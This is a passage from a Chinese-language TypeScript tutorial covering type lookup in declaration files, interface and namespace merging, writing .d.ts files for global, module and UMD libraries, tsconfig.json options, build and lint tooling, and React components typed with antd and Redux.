的 path, 比如：”types”: “dist&#x2F;types&#x2F;index.d.ts”\n另外，务必加上 tslint, 更规范的去用 TS 实现功能，对于入门而言尤为重要\n\n16.4 TSX 和 JSX\n之前我们在用 JavaScript 写 React 时，对文件的扩展名没有什么特别的要求，.js 或者 .jsx 都行。\n但在 TypeScript 中，如果你要使用 JSX 语法，就不能使用 .ts，必须使用 .tsx。如果你不知道，或者忘了这么做，那么你会在使用了 JSX 代码的地方收到类型报错，但代码本身怎么看都没有问题。这也是刚上手 TypeScript + React 时几乎每个人都会遇到的坑。\n关于这一点，TypeScript 只是在官方教程的示例代码中直接用了 *.tsx，但并没有明确说明这一问题\n\n16.5 变量的 Type 怎么找\n上手 TypeScript 之后很快我们就发现，即便是原生的 DOM、或是 React 的 API，也经常会要我们手动指定类型。但这些结构并不是简单的 JavaScript原始类型，在使用 JavaScript 编写相关代码时候由于没有这种需要，我们也没关心过这些东西的类型，突然问起来，还真不知道这些类型叫什么名字。\n不光是这些标准类型，同样的问题在很多第三方的库中也会遇到，比如一些组件库会检查你传入的 Props\n在我看来，这中间其实缺少了一部分的文档，来指导新用户如何找到所需要的类型。既然社区没有提供，那就我来吧。\n当然，让每个开发者都熟记所有的类型肯定是不现实的，总不能每接触一个新的库，就要去记一堆类型吧。放心，世界还是美好的，这种事情，当然是有方法的。\n最直白的方法就是去看库的 Types Definition，也就是那些 .*d.ts 文件。如果你刚好有在用 VS Code 的话，有一个非常方便的操作：把鼠标移动到你想知道它类型的代码上（比如某个变量、某个函数调用，或是某个 JSX 标签、某个组件的 props），右键选择「Go to Definition」（或者光标选中后按 F12），就可以跳转到它的类型定义文件了。\n如果你更习惯使用 VS Code 之外的编辑器，我相信时至今日，它们应该也都早就对 TypeScript 提供了支持。具体操作我不太熟悉，你可以自己探索下（我一直用 VS Code，其它的不太熟）\n一般来说，这个操作可以直接把你带到你想要的地方，但考虑到类型是可以继承的，有时候一次跳转可能不太够，遇到这种情况，那就需要你随机应变一下，沿着继承关系多跳几次，直到找到你想要的内容。\n对于不熟悉的类型，可以通过这个方法去寻找，慢慢熟悉以后，你会发现，一些常见的类型还是很好找的，稍微联想一下英文的表达方式，配合自动补全的提示，一般都不难找到\n\n16.6 常见 Types 之 DOM\nTypeScript 自带了一些基本的类型定义，包括 ECMAScript 和 DOM 的类型定义，所有你需要的类型都可以从这里找到。如果你想做一些「纯 TypeScript 开发」的话，有这些就够了\n比如下面这张截图，就是对 &#96;&#96; 标签的类型定义。我们可以看到，它继承了更加通用的 HTMLElement 类型，并且扩展了一个即将被废弃的 align 属性，以及两组 addEventListener 和 removeEventListener，注意这里使用了重载。\n\n\n\n这里的命名也不是随便起的，都是在 MDN 上可以查到的。还是以 &#96;&#96; 为例，我们已经知道它继承自 HTMLElement，其实再往上，HTMLElement 继承自 Element，Element 又继承自 Node，顺着这条路，你可以挖掘出所有 HTML 标签的类型\n\n\n\n对于一些 DOM 相关的属性，比如 onclick、onchange 等，你都可以如法炮制，找到它们的定义。\n\n16.7 常见 Types 之 React\n关于 TypeScript 的问题，有不少其实是在使用第三方库的时候遇到的，React 就是其中比较典型的一个\n其实方法都一样，只不过相关的类型定义不在 TypeScript 中，而是在 @types/react 中。\nReact 的类型定义的名称其实也很直观，比如我们常见的 React.Component，在定义 Class 组件时，我们需要对 Props 和 State 预先进行类型定义，为什么呢？答案就在它的类型定义中\n\n\n\n再比如，当我们在写一些组件时，我们可能会需要向下传递 this.props.children，但 children 并没有被设为默认值，需要我们自己定义到 props 上，那么它的类型应该是什么呢\n到类型定义中搜一下关键字 children，很快我们就找到了下面的定义\n\n\n\n所有 React 中 JSX 所代表的内容，无论是 render() 的返回，还是 children，我们都可以定义为一个 ReactNode。那这个 ReactNode 长什么样呢？我们通过右键继续寻找\n\n\n\n看到这里，我们不光找到了我们想要的类型，还顺带明白了为什么 render() 可以返回 boolean、null、undefined 表示不渲染任何内容。那么事件呢？当我们给组件定义事件处理函数的时候，也经常会被要求指定类型。还是老办法，找不到咱就搜，比如 onClick 不清楚，那我们就以它为关键字去搜\n\n\n\n据此我们找到一个叫 MouseEventHandler 的定义，这名字，够直白吧。好了，我们找到想要的了。不过既然来了，不如继续看一下，看看还能发现什么。我们右键 MouseEventHandler 急需往下看：\n\n\n\n看到了吗，所有的事件处理函数都有对应的定义，每个都需要一个泛型参数，传递了事件的类型，名称也挺直白的\n\n\n\n事件的类型也被我们挖出来了，以后如果需要单独定义一个事件相关的类型，就可以直接用了。以此类推，不管是什么东西的类型，都可以去它们对应的 @types/xxx里，按关键字搜\n\n16.8 多重 extends\n我们知道 Interface 是可以多继承的，extends 后面可以跟多个其它 Interface，我们不能保证被继承的多个 Interface 一定没有重复的属性，那么当属性重复，但类型定义不同时，最终的结果会怎么样呢？\n在 TypeScript 中，Interface 会按照从右往左的顺序去合并多个被继承的 Interface，也就是说，同名属性，左边的会覆盖右边的\n\ninterface A &#123;  value?: string&#125;interface B &#123;  value: string&#125;interface C &#123;  value: number&#125;interface D extends A, B &#123;&#125;// value?: stringinterface E extends B, C &#123;&#125;// value: string\n\n16.9 obj[prop] 无法访问怎么办\n有时候我们会定义一些集合型的数据，例如对象、枚举等，但在调用的时候，我们未必会直接通过 obj.prop 的形式去调用，可能会是以 obj[prop] 这种动态索引的形式去访问，但通过动态索引的方式就无法确定最终访问的元素是否存在，因此在 TypeScript 中，默认是不允许这种操作的\n但这又是个非常合理，而且非常常见的场景，怎么办呢？TypeScript 允许为类型添加索引，以实现这一点。\n\ninterface Foo &#123;  x: string,  y: number  [index: string]: string | number&#125;\n\n\n这个方法虽然有效，但每次都要手动为类型加索引，重复多了也挺心累的。包括在一些「配置对象」中，我们甚至无法确定有哪些类型，有没有一种更加通用、更加一劳永逸的方法。\n其实在 TypeScript的官方文档中就有提到这个方案，官方管它叫 OptionBag，大概就是指 config、option 等用于提供配置信息的这么一类参数。我不是很确定这到底是个常规的英文单词，还是 TypeScript 中特定的术语（个人感觉是前者），反正就这么个意思吧。简单说来，我们可以定义下面这样一个类型：\n\ninterface OptionBag &#123;  [index: string]: any&#125;\n\n\n这是一个非常通用的结构，以字符串为键，值可以是任何类型，并且支持索引 —— 这不就是 Object 么。\n之后所有需要动态索引的结构，或是作为配置对象的结构，都可以直接指定为，或是继承 OptionBag。这个方案以牺牲一定的类型检查为代价，换取了操作上的便利。\n理论上讲，OptionBag 可以适用于所有类似对象这样的结构，但不建议各位真就这么做。这个方案只能是用在一些对类型要求不那么严格，或是无法预知类型的场景中，能够确定的类型还是尽可能地写一下，否则就失去了使用 TypeScript 意义了\n\n十七、其他技巧1. 安全导航操作符 ( ?. )和非空断言操作符（!.）\n\n安全导航操作符 ( ?. ) 和空属性路径：\n\n\n为了解决导航时变量值为null时，页面运行时出错的问题\n\n\n非空断言操作符\n\n\n能确定变量值一定不为空时使用。与安全导航操作符不同的是，非空断言操作符不会防止出现 null 或 undefined\n\nlet s = e!.name; // 断言e是非空并访问name属性\n\n第二章 工程篇\n一、使用命名空间\n不要在一个模块中使用命名空间，最好在一个全局中使用\n\n// a.tsnamespace Shape &#123;    const pi = Math.PI    export function cricle(r: number) &#123;        return pi * r ** 2    &#125;&#125;// b.ts// 三斜线引用a/// &lt;reference path=&quot;a.ts&quot; /&gt;namespace Shape &#123;    export function square(x: number) &#123;        return x * x    &#125;&#125;console.log(Shape.cricle(2))console.log(Shape.square(2))// 更方便使用 不是es6中的importimport cricle = Shape.cricleconsole.log(cricle(2))\n\n二、理解联合声明// 接口声明合并interface A &#123;    x: number;    // y: string;    foo(bar: number): number; // 5    foo(bar: &#x27;a&#x27;): string; // 2&#125;interface A &#123;    y: number;    foo(bar: string): string; // 3    foo(bar: string[]): string[]; // 4    foo(bar: &#x27;b&#x27;): string; // 1&#125;let a: A = &#123;    x: 1,    y: 2,    foo(bar: any) &#123;        return bar    &#125;&#125;// 命名空间和类声明合并--命名空间需要放到后面class C &#123;&#125;namespace C &#123;    export let state = 1&#125;console.log(C.state)// 命名空间和函数声明合并--命名空间需要放到后面function Lib() &#123;&#125;namespace Lib &#123;    export let version = &#x27;1.0&#x27;&#125;console.log(Lib.version)// 命名空间和枚举声明合并--位置没有要求enum Color &#123;    Red,    Yellow,    Blue&#125;namespace Color &#123;    export function mix() &#123;&#125;&#125;console.log(Color)\n\n三、如何编写声明文件–引入类库\n类库分为三类：全局类库、模块类库、UMD类库\n\ndeclare var // 声明全局变量declare function // 声明全局方法declare class // 声明全局类declare enum // 声明全局枚举类型declare global // 扩展全局变量declare module // 扩展模块\n\n\n大多数的声明文件社区已经帮我们安装好了，使用@types/包名声明文件即可\n\n\nTypescript声明文件查找 https://microsoft.github.io/TypeSearch/\n\n以jquery为例子\nyarn add @types/jquery\n\n引入了一个JS类库，但是社区又没有提供类型声明文件，我该如何去编写它的类型声明文件\n\n先确定这个库的类型，全局库、模块库、还是UMD库，然后参照下面介绍的方法，把它的API声明逐步添加进来（暂时用不到的API也可以不写）\n\n3.1 三种类库声明文件写法3.1.1 全局库// global-lib.d.ts    declare function globalLib(options: globalLib.Options): void;// 函数和命名空间的声明合并 为这个函数提供了一些属性declare namespace globalLib &#123;    const version: string;    function doSomething(): void;    interface Options &#123;        [key: string]: any    &#125;&#125;// global-lib.js// 和声明文件对应function globalLib(options) &#123;    console.log(options);&#125;globalLib.version = &#x27;1.0.0&#x27;;globalLib.doSomething = function() &#123;    console.log(&#x27;globalLib do something&#x27;);&#125;;// 全局使用 index.tsglobalLib(&#123;x:1&#125;)globalLib.doSomething()\n\n3.1.2 模块类库// module-lib.d.tsdeclare function moduleLib(options: Options): voidinterface Options &#123;    [key: string]: any&#125;declare namespace moduleLib &#123;    const version: string    function doSomething(): void&#125;export = moduleLib// module-lib.jsconst version = &#x27;1.0.0&#x27;;function doSomething() &#123;    console.log(&#x27;moduleLib do something&#x27;);&#125;function moduleLib(options) &#123;    console.log(options);&#125;moduleLib.version = version;moduleLib.doSomething = doSomething;module.exports = moduleLib;// index.ts 使用import umdLib from &#x27;./umd-lib&#x27;umdLib.doSomething()\n\n3.1.3 UMD类库// umd-lib.d.tsdeclare namespace umdLib &#123;    // 省略了export    const version: string    function doSomething(): void&#125;// UMD库不可缺少的语句export as namespace umdLibexport = umdLib// umd-lib.js(function (root, factory) &#123;    if (typeof define === &quot;function&quot; &amp;&amp; define.amd) &#123;        define(factory);    &#125; else if (typeof module === &quot;object&quot; &amp;&amp; module.exports) &#123;        module.exports = factory();    &#125; else &#123;        root.umdLib = factory();    &#125;&#125;(this, function() &#123;    return &#123;        // 需要为这两个成员编写声明文件        version: &#x27;1.0.0&#x27;,        doSomething() &#123;            console.log(&#x27;umdLib do something&#x27;);        &#125;    &#125;&#125;))// index.ts使用import umdLib from &#x27;./umd-lib&#x27;// 可以不用导入umd-lib模块。但是需要打开tsconfig.tson中的umd配置umdLib.doSomething()\n\n3.2 两种插件声明文件写法3.2.1 模块化插件declare module\ndeclare module 可以给类库添加一些自定义方法。 扩展模块\n\n// 模块插件import m from &#x27;moment&#x27;;declare module &#x27;moment&#x27; &#123;    // 给moment自定义一些方法    export function myFunction(): void;&#125;m.myFunction = () =&gt; &#123;&#125;\n\n3.2.2 全局插件declare global// 全局插件declare global &#123;    namespace globalLib &#123;        function doAnyting(): void    &#125;&#125;// 在全局变量添加方法// 会对全局变量造成污染 一般不这么做globalLib.doAnyting = () =&gt; &#123;&#125;\n\n3.3 jquery声明文件示例// index.d.ts入口// Type definitions for jquery 3.3// Project: https://jquery.com// Definitions by: Leonard Thieu &lt;https://github.com/leonard-thieu&gt;//                 Boris Yankov &lt;https://github.com/borisyankov&gt;//                 Christian Hoffmeister &lt;https://github.com/choffmeister&gt;//                 Steve Fenton &lt;https://github.com/Steve-Fenton&gt;//                 Diullei Gomes &lt;https://github.com/Diullei&gt;//                 Tass Iliopoulos &lt;https://github.com/tasoili&gt;//                 Jason Swearingen &lt;https://github.com/jasons-novaleaf&gt;//                 Sean Hill &lt;https://github.com/seanski&gt;//                 Guus Goossens &lt;https://github.com/Guuz&gt;//                 Kelly Summerlin &lt;https://github.com/ksummerlin&gt;//                 Basarat Ali Syed &lt;https://github.com/basarat&gt;//                 Nicholas Wolverson &lt;https://github.com/nwolverson&gt;//                 Derek Cicerone &lt;https://github.com/derekcicerone&gt;//                 Andrew Gaspar &lt;https://github.com/AndrewGaspar&gt;//                 Seikichi Kondo &lt;https://github.com/seikichi&gt;//                 Benjamin Jackman &lt;https://github.com/benjaminjackman&gt;//                 Poul Sorensen &lt;https://github.com/s093294&gt;//                 Josh Strobl &lt;https://github.com/JoshStrobl&gt;//                 John Reilly &lt;https://github.com/johnnyreilly&gt;//                 Dick van den Brink &lt;https://github.com/DickvdBrink&gt;//                 Thomas Schulz &lt;https://github.com/King2500&gt;//                 Terry Mun &lt;https://github.com/terrymun&gt;// Definitions: https://github.com/DefinitelyTyped/DefinitelyTyped// TypeScript Version: 2.3// 三斜线引入模块/// &lt;reference types=&quot;sizzle&quot; /&gt;/// &lt;reference path=&quot;JQueryStatic.d.ts&quot; /&gt;/// &lt;reference path=&quot;JQuery.d.ts&quot; /&gt;/// &lt;reference path=&quot;misc.d.ts&quot; /&gt;/// &lt;reference path=&quot;legacy.d.ts&quot; /&gt;export = jQuery;\n\n四、配置tsconfig.json4.1 基础配置&#123;  // ===与文件相关的选项===  &quot;files&quot; : [&#x27;src/index.ts&#x27;], // 编译的文件列表  &quot;include&quot;: [&#x27;src&#x27;], // 指定编译文件  &quot;exclude&quot;: [&#x27;src/lib&#x27;], // 排除编译文件    // ====与编译相关的选项====  &quot;compilerOptions&quot;: &#123;      // &quot;incremental&quot;: true,                // 增量编译，再次编译会增量编译      // &quot;tsBuildInfoFile&quot;: &quot;./buildFile&quot;,   // 增量编译文件的存储位置      // &quot;diagnostics&quot;: true,                // 打印诊断信息      // &quot;target&quot;: &quot;es5&quot;,           // 目标语言的版本      // &quot;module&quot;: &quot;commonjs&quot;,      // 生成代码的模块标准      // &quot;outFile&quot;: &quot;./app.js&quot;,     // 将多个相互依赖的文件生成一个文件，可以用在 AMD 模块中               // 比如你需要使用es2019方法 需要在这里导入模块 &quot;lib&quot;: [&#x27;es2019.arrary&#x27;]      // &quot;lib&quot;: [],                 // TS 需要引用的库，即声明文件，es5 默认 &quot;dom&quot;, &quot;es5&quot;, &quot;scripthost&quot;      // &quot;allowJs&quot;: true,           // 允许编译 JS 文件（js、jsx）      // &quot;checkJs&quot;: true,           // 允许在 JS 文件中报错，通常与 allowJS 一起使用      // &quot;outDir&quot;: &quot;./out&quot;,         // 指定输出目录      // &quot;rootDir&quot;: &quot;./&quot;,           // 指定输入文件目录（用于输出）      // &quot;declaration&quot;: true,         // 生成声明文件      // &quot;declarationDir&quot;: &quot;./d&quot;,     // 声明文件的路径      // &quot;emitDeclarationOnly&quot;: true, // 只生成声明文件      // &quot;sourceMap&quot;: true,           // 生成目标文件的 sourceMap      // &quot;inlineSourceMap&quot;: true,     // 生成目标文件的 inline sourceMap      // &quot;declarationMap&quot;: true,      // 生成声明文件的 sourceMap      // &quot;typeRoots&quot;: [],             // 声明文件目录，默认 node_modules/@types      // &quot;types&quot;: [],                 // 声明文件包      // &quot;removeComments&quot;: true,    // 删除注释      // &quot;noEmit&quot;: true,            // 不输出文件      // &quot;noEmitOnError&quot;: true,     // 发生错误时不输出文件      // &quot;noEmitHelpers&quot;: true,     // 不生成 helper 函数，需额外安装 ts-helpers      // &quot;importHelpers&quot;: true,     // 通过 tslib 引入 helper 函数，文件必须是模块      // &quot;downlevelIteration&quot;: true,    // 降级遍历器的实现（es3/5）      // &quot;strict&quot;: true,                        // 开启所有严格的类型检查      // &quot;alwaysStrict&quot;: false,                 // 在代码中注入 &quot;use strict&quot;;      // &quot;noImplicitAny&quot;: false,                // 不允许隐式的 any 类型      // &quot;strictNullChecks&quot;: false,             // 不允许把 null、undefined 赋值给其他类型变量      // &quot;strictFunctionTypes&quot;: false           // 不允许函数参数双向协变      // &quot;strictPropertyInitialization&quot;: false, // 类的实例属性必须初始化      // &quot;strictBindCallApply&quot;: false,          // 严格的 bind/call/apply 检查      // &quot;noImplicitThis&quot;: false,               // 不允许 this 有隐式的 any 类型      // &quot;noUnusedLocals&quot;: true,                // 检查只声明，未使用的局部变量      // &quot;noUnusedParameters&quot;: true,            // 检查未使用的函数参数      // &quot;noFallthroughCasesInSwitch&quot;: true,    // 防止 switch 语句贯穿      // &quot;noImplicitReturns&quot;: true,             // 每个分支都要有返回值      // &quot;esModuleInterop&quot;: true,               // 允许 export = 导出，由import from 导入      // &quot;allowUmdGlobalAccess&quot;: true,          // 允许在模块中访问 UMD 全局变量      // &quot;moduleResolution&quot;: &quot;node&quot;,            // 模块解析策略      // &quot;baseUrl&quot;: &quot;./&quot;,                       // 解析非相对模块的基地址      // &quot;paths&quot;: &#123;                             // 路径映射，相对于 baseUrl      //   &quot;jquery&quot;: [&quot;node_modules/jquery/dist/jquery.slim.min.js&quot;]      // &#125;,      // &quot;rootDirs&quot;: [&quot;src&quot;, &quot;out&quot;],            // 将多个目录放在一个虚拟目录下，用于运行时      // &quot;listEmittedFiles&quot;: true,        // 打印输出的文件      // &quot;listFiles&quot;: true,               // 打印编译的文件（包括引用的声明文件）  &#125;&#125;\n\n\n也可以把公共的抽离出来\n\n// tsconfig.base.json&#123;  &quot;files&quot; : [&#x27;src/index.ts&#x27;], // 编译的文件列表  &quot;include&quot;: [&#x27;src&#x27;], // 指定编译文件  &quot;exclude&quot;: [&#x27;src/lib&#x27;], // 排除编译文件&#125;&quot;extends&quot;: &#x27;./tsconfig.base&#x27;,&quot;exclude&quot;: [] // 覆盖之前的\n\n4.2 工程引用配置多个项目\n每个项目都有一份独立的tsconfig.json，继承一份公共的配置，最后可单独构建每个子项目工程\n\n\n参考学习typescript项目 https://github.com/microsoft/TypeScript/tree/master/src\n\n// 示例 项目入口&#123;  &quot;compilerOptions&quot;: &#123;    &quot;target&quot;: &quot;es5&quot;,    &quot;module&quot;: &quot;commonjs&quot;,    &quot;strict&quot;: true,    &quot;composite&quot;: true,    &quot;declaration&quot;: true  &#125;&#125;// 子工程1// src/client/tsconfig.json&#123;    &quot;extends&quot;: &quot;../../tsconfig.json&quot;, //继承基础配置    &quot;compilerOptions&quot;: &#123;        &quot;outDir&quot;: &quot;../../dist/client&quot;, // 输出文件    &#125;,    &quot;references&quot;: [        &#123; &quot;path&quot;: &quot;../common&quot; &#125; // 依赖文件    ]&#125;// 子工程2// src/server/tsconfig.json&#123;    &quot;extends&quot;: &quot;../../tsconfig.json&quot;,    &quot;compilerOptions&quot;: &#123;        &quot;outDir&quot;: &quot;../../dist/server&quot;,    &#125;,    &quot;references&quot;: [        &#123; &quot;path&quot;: &quot;../common&quot; &#125;    ]&#125;\n\n五、编译工具ts-loader、ts-lint如何选择Typescript编译器\n\n\n如果没有使用过babel，首选Typescript自身编译器(可配合Ts-loader使用)\n如果项目中已经使用babel，安装@babel/preset-typescript(可配合tsc做类型检查)\n两种编译工具不要混用\n\n\ntypescript-eslint与babel-eslint区别\n\n\nbabel-eslint支持typescript没有额外的语法检查，抛弃typescript,不支持类型检查\ntypescript-eslint基础typescript的AST,基于创建基于类型信息的规则（tsconfig.json）\n\n\n\n两者底层机制不一样，不要一起使用\nbabel体系建议使用babel-eslint，否则使用typescript-eslint\n\n总结\n\n编译工具\nts-loader\n@babel/preset-typescript\n\n\n代码检查工具\nbabel-eslint\ntypescript-eslint\n\n\n\n六、使用jest进行单元测试\n单元测试工具\nts-jest – 能够在测试用例中进行类型检查\nbabel-jest – 没有进行类型检查\n\n\n\n\n生成配置文件 ts-jest config:init\n\n第三章 项目实战一、思维导图\n二、React项目实践2.1 手动创建react项目\n项目代码 https://github.com/poetries/typescript-in-action/tree/master/ts-react\n\n1. 安装依赖文件\nyarn add @types/react @types/react-dom\n\n2. 修改tsconfig.json配置\n\n修改 compilerOptions中的jsx为react\n\n2.2 使用脚手架安装\n项目代码 https://github.com/poetries/typescript-in-action/tree/master/ts-react-app\n\ncreate-react-app ts-react-app --typescript\n\n2.2.1 函数组件import React from &#x27;react&#x27;;import &#123; Button &#125; from &#x27;antd&#x27;;interface Greeting &#123;    name: string;    firstName: string;    lastName: string;&#125;const Hello = (props: Greeting) =&gt; &lt;Button&gt;Hello &#123;props.name&#125;&lt;/Button&gt;// const Hello: React.FC&lt;Greeting&gt; = (&#123;//     name,//     firstName,//     lastName,//     children// &#125;) =&gt; &lt;Button&gt;Hello &#123;name&#125;&lt;/Button&gt;Hello.defaultProps = &#123;    firstName: &#x27;&#x27;,    lastName: &#x27;&#x27;&#125;export default Hello;\n\n2.2.2 类组件import React, &#123; Component &#125; from &#x27;react&#x27;;import &#123; Button &#125; from &#x27;antd&#x27;;interface Greeting &#123;    name: string;    firstName?: string;    lastName?: string;&#125;interface HelloState &#123;    count: number&#125;class HelloClass extends Component&lt;Greeting, HelloState&gt; &#123;    state: HelloState = &#123;        count: 0    &#125;    static defaultProps = &#123;        firstName: &#x27;&#x27;,        lastName: &#x27;&#x27;    &#125;    render() &#123;        return (            &lt;&gt;                &lt;p&gt;你点击了 &#123;this.state.count&#125; 次&lt;/p&gt;                &lt;Button onClick=&#123;() =&gt; &#123;this.setState(&#123;count: this.state.count + 1&#125;)&#125;&#125;&gt;                    Hello &#123;this.props.name&#125;                &lt;/Button&gt;            &lt;/&gt;        )    &#125;&#125;export default HelloClass;\n\n2.2.3 高阶组件import React, &#123; Component &#125; from &#x27;react&#x27;;import HelloClass from &#x27;./HelloClass&#x27;;interface Loading &#123;    loading: boolean&#125;function HelloHOC&lt;P&gt;(WrappedComponent: React.ComponentType&lt;P&gt;) &#123;    return class extends Component&lt;P &amp; Loading&gt; &#123;        render() &#123;            const &#123; loading, ...props &#125; = this.props;            return loading ? &lt;div&gt;Loading...&lt;/div&gt; : &lt;WrappedComponent &#123; ...props as P &#125; /&gt;;        &#125;    &#125;&#125;export default HelloHOC(HelloClass);\n\n2.2.4 Hooks组件import React, &#123; useState, useEffect &#125; from &#x27;react&#x27;;import &#123; Button &#125; from &#x27;antd&#x27;;interface Greeting &#123;    name: string;    firstName: string;    lastName: string;&#125;const HelloHooks = (props: Greeting) =&gt; &#123;    const [count, setCount] = useState(0);    const [text, setText] = useState&lt;string | null&gt;(null);    useEffect(() =&gt; &#123;        if (count &gt; 5) &#123;            setText(&#x27;休息一下&#x27;);        &#125;    &#125;, [count]);    return (        &lt;&gt;            &lt;p&gt;你点击了 &#123;count&#125; 次 &#123;text&#125;&lt;/p&gt;            &lt;Button onClick=&#123;() =&gt; &#123;setCount(count + 1)&#125;&#125;&gt;                Hello &#123;props.name&#125;            &lt;/Button&gt;        &lt;/&gt;    )&#125;HelloHooks.defaultProps = &#123;    firstName: &#x27;&#x27;,    lastName: &#x27;&#x27;&#125;export default HelloHooks;\n\n2.2.5 事件处理与数据请求import React, &#123; Component, useState, useEffect &#125; from &#x27;react&#x27;;import &#123; Form, Input, Select, Button &#125; from &#x27;antd&#x27;;import &#123; FormComponentProps &#125; from &#x27;antd/lib/form&#x27;;import &#123; get &#125; from &#x27;../../utils/request&#x27;;import &#123; GET_EMPLOYEE_URL &#125; from &#x27;../../constants/urls&#x27;;import &#123; EmployeeRequest, EmployeeResponse &#125; from &#x27;../../interface/employee&#x27;;const &#123; Option &#125; = Select;interface Props extends FormComponentProps &#123;    onDataChange(data: EmployeeResponse): void&#125;// Hooks version// const QueryFormHooks = (props: Props) =&gt; &#123;//     const [name, setName] = useState(&#x27;&#x27;);//     const [departmentId, setDepartmentId] = useState&lt;number | undefined&gt;();//     const handleNameChange = (e: React.FormEvent&lt;HTMLInputElement&gt;) =&gt; &#123;//         setName(e.currentTarget.value)//     &#125;//     const handleDepartmentChange = (value: number) =&gt; &#123;//         setDepartmentId(value)//     &#125;//     const handleSubmit = () =&gt; &#123;//         queryEmployee(&#123;name, departmentId&#125;);//     &#125;//     const queryEmployee = (param: EmployeeRequest) =&gt; &#123;//         get(GET_EMPLOYEE_URL, param).then(res =&gt; &#123;//             props.onDataChange(res.data);//         &#125;);//     &#125;//     useEffect(() =&gt; &#123;//         queryEmployee(&#123;name, departmentId&#125;);//     &#125;, [])//     return (//         &lt;&gt;//             &lt;Form layout=&quot;inline&quot;&gt;//                 &lt;Form.Item&gt;//                     &lt;Input//                         placeholder=&quot;姓名&quot;//                         style=&#123;&#123; width: 120 &#125;&#125;//                         allowClear//                         value=&#123;name&#125;//                         onChange=&#123;handleNameChange&#125;//                     /&gt;//                 &lt;/Form.Item&gt;//                 &lt;Form.Item&gt;//                 &lt;Select//                     placeholder=&quot;部门&quot;//                     style=&#123;&#123; width: 120 &#125;&#125;//                     allowClear//                     value=&#123;departmentId&#125;//                     onChange=&#123;handleDepartmentChange&#125;//                 &gt;//                     &lt;Option value=&#123;1&#125;&gt;技术部&lt;/Option&gt;//                     &lt;Option value=&#123;2&#125;&gt;产品部&lt;/Option&gt;//                     &lt;Option value=&#123;3&#125;&gt;市场部&lt;/Option&gt;//                     &lt;Option value=&#123;4&#125;&gt;运营部&lt;/Option&gt;//                 &lt;/Select&gt;//                 &lt;/Form.Item&gt;//                 &lt;Form.Item&gt;//                     &lt;Button type=&quot;primary&quot; onClick=&#123;handleSubmit&#125;&gt;查询&lt;/Button&gt;//                 &lt;/Form.Item&gt;//             &lt;/Form&gt;//         &lt;/&gt;//     )// &#125;class QueryForm extends Component&lt;Props, EmployeeRequest&gt; &#123;    state: EmployeeRequest = &#123;        name: &#x27;&#x27;,        departmentId: undefined    &#125;    handleNameChange = (e: React.FormEvent&lt;HTMLInputElement&gt;) =&gt; &#123;        this.setState(&#123;            name: e.currentTarget.value        &#125;);    &#125;    handleDepartmentChange = (value: number) =&gt; &#123;        this.setState(&#123;            departmentId: value        &#125;);    &#125;    handleSubmit = () =&gt; &#123;        this.queryEmployee(this.state);    &#125;    componentDidMount() &#123;        this.queryEmployee(this.state);    &#125;    queryEmployee(param: EmployeeRequest) &#123;        get(GET_EMPLOYEE_URL, param).then(res =&gt; &#123;            this.props.onDataChange(res.data);        &#125;);    &#125;    render() &#123;        return (            &lt;Form layout=&quot;inline&quot;&gt;                &lt;Form.Item&gt;                    &lt;Input                        placeholder=&quot;姓名&quot;                        style=&#123;&#123; width: 120 &#125;&#125;                        allowClear                        value=&#123;this.state.name&#125;                        onChange=&#123;this.handleNameChange&#125;                    /&gt;                &lt;/Form.Item&gt;                &lt;Form.Item&gt;                &lt;Select                    placeholder=&quot;部门&quot;                    style=&#123;&#123; width: 120 &#125;&#125;                    allowClear                    value=&#123;this.state.departmentId&#125;                    onChange=&#123;this.handleDepartmentChange&#125;                &gt;                    &lt;Option value=&#123;1&#125;&gt;技术部&lt;/Option&gt;                    &lt;Option value=&#123;2&#125;&gt;产品部&lt;/Option&gt;                    &lt;Option value=&#123;3&#125;&gt;市场部&lt;/Option&gt;                    &lt;Option value=&#123;4&#125;&gt;运营部&lt;/Option&gt;                &lt;/Select&gt;                &lt;/Form.Item&gt;                &lt;Form.Item&gt;                    &lt;Button type=&quot;primary&quot; onClick=&#123;this.handleSubmit&#125;&gt;查询&lt;/Button&gt;                &lt;/Form.Item&gt;            &lt;/Form&gt;        )    &#125;&#125;const WrapQueryForm = Form.create&lt;Props&gt;(&#123;    name: &#x27;employee_query&#x27;&#125;)(QueryForm);export default WrapQueryForm;\n\n2.2.6 列表渲染import React, &#123; Component, useState &#125; from &#x27;react&#x27;;import &#123; Table &#125; from &#x27;antd&#x27;;import &#x27;./index.css&#x27;;import QueryForm from &#x27;./QueryForm&#x27;;import &#123; employeeColumns &#125; from &#x27;./colums&#x27;;import &#123; EmployeeResponse &#125; from &#x27;../../interface/employee&#x27;;// Hooks version// const Employee = () =&gt; &#123;//     const [employee, setEmployee] = useState&lt;EmployeeResponse&gt;(undefined);//     const getTotal = () =&gt; &#123;//         let total: number;//         if (typeof employee !== &#x27;undefined&#x27;) &#123;//             total = employee.length//         &#125; else &#123;//             total = 0//         &#125;//         return &lt;p&gt;共 &#123;total&#125; 名员工&lt;/p&gt;//     &#125;//     return (//         &lt;&gt;//             &lt;QueryForm onDataChange=&#123;setEmployee&#125; /&gt;//             &#123;/* &#123;getTotal()&#125; */&#125;//             &lt;Table columns=&#123;employeeColumns&#125; dataSource=&#123;employee&#125; className=&quot;table&quot; /&gt;//         &lt;/&gt;//     )// &#125;interface State &#123;    employee: EmployeeResponse&#125;class Employee extends Component&lt;&#123;&#125;, State&gt; &#123;    state: State = &#123;        employee: undefined    &#125;    setEmployee = (employee: EmployeeResponse) =&gt; &#123;        this.setState(&#123;            employee        &#125;);    &#125;    getTotal() &#123;        let total: number;        // 类型保护        if (typeof this.state.employee !== &#x27;undefined&#x27;) &#123;            total = this.state.employee.length        &#125; else &#123;            total = 0        &#125;        return &lt;p&gt;共 &#123;total&#125; 名员工&lt;/p&gt;    &#125;    render() &#123;        return (            &lt;&gt;                &lt;QueryForm onDataChange=&#123;this.setEmployee&#125; /&gt;                &#123;/* &#123;this.getTotal()&#125; */&#125;                &lt;Table columns=&#123;employeeColumns&#125; dataSource=&#123;this.state.employee&#125; className=&quot;table&quot; /&gt;            &lt;/&gt;        )    &#125;&#125;export default Employee;\n\n2.2.7 Redux与类型\n项目代码 https://github.com/poetries/typescript-in-action/tree/master/ts-redux\n\nimport &#123; Dispatch &#125; from &#x27;redux&#x27;;import _ from &#x27;lodash&#x27;;import &#123; get, post &#125; from &#x27;../../utils/request&#x27;;import &#123; department, level &#125; from &#x27;../../constants/options&#x27;;import &#123;    GET_EMPLOYEE_URL,    CREATE_EMPLOYEE_URL,    DELETE_EMPLOYEE_URL,    UPDATE_EMPLOYEE_URL&#125; from 